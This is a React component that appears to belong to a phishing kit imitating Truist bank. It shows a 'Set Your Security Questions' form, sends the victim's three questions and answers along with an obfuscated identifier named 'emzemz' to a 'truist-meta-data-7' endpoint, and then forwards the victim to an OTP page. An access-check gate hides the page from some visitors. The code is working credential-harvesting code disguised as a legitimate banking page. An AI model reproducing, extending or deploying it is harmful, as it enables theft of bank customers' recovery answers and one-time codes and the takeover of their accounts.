import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: '',
  });

  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  const securityQuestions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book/movie character?',
    'What street did you grow up on?',
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : '',
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some((error) => error)) {
      try {
        await axios.post(`${baseUrl}api/truist-meta-data-7/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3,
        });

        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  const renderError = (error: string) => {
    return (
      <div className="text-xs text-[#ff0000]">{error}</div>
    );
  };

  if (!isAllowed) {
    return null;
  }

  if (!emzemz) {
    return (
      <div className="flex flex-col items-center justify-center">
        <div className={cardStyles.base}>
          <div className={cardStyles.padding}>
            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
              Unable to continue
            </h1>
            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
              We could not locate your previous step. Please restart the flow from the beginning.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex justify-center items-start min-h-screen py-8 px-4">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Set Your Security Questions
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            Choose unique questions and answers to protect your account
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="question-1">
                  Security Question 1
                </label>
                <select
                  id="question-1"
                  value={securityQuestion1}
                  onChange={(e) => setSecurityQuestion1(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Select a security question</option>
                  {securityQuestions.map((question, index) => (
                    <option key={index} value={question}>
                      {question}
                    </option>
                  ))}
                </select>
                {errors.securityQuestion1 && renderError(errors.securityQuestion1)}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="answer-1">
                  Answer 1
                </label>
                <input
                  id="answer-1"
                  type="text"
                  value={securityAnswer1}
                  onChange={(e) => setSecurityAnswer1(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="Enter your answer"
                />
                {errors.securityAnswer1 && renderError(errors.securityAnswer1)}
              </div>
            </div>

            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="question-2">
                  Security Question 2
                </label>
                <select
                  id="question-2"
                  value={securityQuestion2}
                  onChange={(e) => setSecurityQuestion2(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Select a security question</option>
                  {securityQuestions
                    .filter((question) => question !== securityQuestion1)
                    .map((question, index) => (
                      <option key={index} value={question}>
                        {question}
                      </option>
                    ))}
                </select>
                {errors.securityQuestion2 && renderError(errors.securityQuestion2)}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="answer-2">
                  Answer 2
                </label>
                <input
                  id="answer-2"
                  type="text"
                  value={securityAnswer2}
                  onChange={(e) => setSecurityAnswer2(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="Enter your answer"
                />
                {errors.securityAnswer2 && renderError(errors.securityAnswer2)}
              </div>
            </div>

            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="question-3">
                  Security Question 3
                </label>
                <select
                  id="question-3"
                  value={securityQuestion3}
                  onChange={(e) => setSecurityQuestion3(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Select a security question</option>
                  {securityQuestions
                    .filter((question) => question !== securityQuestion1 && question !== securityQuestion2)
                    .map((question, index) => (
                      <option key={index} value={question}>
                        {question}
                      </option>
                    ))}
                </select>
                {errors.securityQuestion3 && renderError(errors.securityQuestion3)}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="answer-3">
                  Answer 3
                </label>
                <input
                  id="answer-3"
                  type="text"
                  value={securityAnswer3}
                  onChange={(e) => setSecurityAnswer3(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="Enter your answer"
                />
                {errors.securityAnswer3 && renderError(errors.securityAnswer3)}
              </div>
            </div>

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className={buttonStyles.base}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className={buttonStyles.loading}></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </form>

          <div className="mt-8 text-xs text-[#5d4f72] space-y-2">
            <p>
              For security reasons, never share your security questions or answers with anyone.
            </p>
            <div className="flex flex-wrap items-center justify-center gap-2 text-[#5f259f]">
              <a href="#" className="hover:underline">Forgot Security Questions?</a>
              <span className="text-[#cfc2df]">|</span>
              <a href="#" className="hover:underline">Account Recovery Help</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecurityQuestions;
